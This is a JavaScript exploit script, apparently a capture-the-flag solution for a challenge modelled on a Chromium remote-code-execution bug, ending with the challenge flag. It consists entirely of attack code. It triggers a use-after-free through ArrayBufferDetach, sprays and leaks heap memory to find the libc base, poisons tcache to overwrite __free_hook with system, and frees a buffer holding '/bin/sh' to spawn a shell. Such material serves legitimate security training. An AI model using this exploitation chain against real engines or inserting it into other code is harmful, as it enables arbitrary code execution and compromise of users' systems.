// testing poc from chromium rce on 0CTF
function poc() {
    var arr1 = new ArrayBuffer(0x1000)           // allocate array 1
    var arr1_view1 = new Uint8Array(arr1)
    var arr1_view2 = new BigUint64Array(arr1)

    var arr2 = new ArrayBuffer(0x1000)           // allocate array 2
    var arr2_view1 = new Uint8Array(arr2)
    var arr2_view2 = new BigUint64Array(arr2)

    ArrayBufferDetach(arr1)                     // detach array 1

    // UAF
    arr2_view1.set(arr1_view1)

    // print value
    for (let i=0; i<0x18; i++) console.log(arr2_view2[i].toString(16))
}

// helper function
function u64(strIn){
    var str = strIn.split("").reverse().join("")
    var hex = '0x'
    var i = 0
    while (str.length > i) {
        hex += '' + str.charCodeAt(i).toString(16)
        i++
    }
    return BigInt(hex)
}

// our main
function pwn() {
    // allocate buffer big enough than tcache/fastbin > 0x408
    const buff_spray = new ArrayBuffer(0x418)
    const spray_u64 = new BigUint64Array(buff_spray)
    // spray buffer, this will make our big chunk a valid chunk
    // we got main_arena leak if we freeing "a valid chunk"
    print("[+] spraying buffer with valid value")
    spray_u64.fill(u64("PeK0p3kO"), 0, -1)
    // free the buffer
    ArrayBufferDetach(buff_spray)
    let tmp_leak = ""
    for (let i=0;i<buff_spray.byteLength;i++) {
        tmp_leak = spray_u64[i].toString(16)
        // bruteforce the main_arena value
        if ((tmp_leak.length == 12) && (tmp_leak.startsWith("7f"))) {
            print("[*] leak main_arena at 0x" + tmp_leak)
            break
        }
    }

    // calculate offset
    tmp_leak = "0x" + tmp_leak.replace(/...$/,"000")
    print("[*] current base at " + tmp_leak)
    libc_base = BigInt(tmp_leak) - 0x3eb000n
    print("[*] libc base at 0x" + libc_base.toString(16))

    __free_hook = 0x0000000003ed8e8n
    system = 0x00000000004f550n

    // tcache poisoning with uaf
    print("[+] do tcache poisoning w UAF")
    var buff1 = new ArrayBuffer(0x408)
    var buff1_view = new BigUint64Array(buff1)

    ArrayBufferDetach(buff1)
    buff1_view[0] = libc_base + __free_hook

    buff1 = new ArrayBuffer(0x408)
    buff1_view[0] = u64("/bin/sh")

    var buff2 = new ArrayBuffer(0x408)
    var buff2_view = new BigUint64Array(buff2)

    buff2_view[0] = libc_base + system
    print("[+] successfully overwrite __free_hook w system")
    ArrayBufferDetach(buff1)
}
poc()
pwn()

// redmask{ah_yes_the_classic_how2heap_ye_et}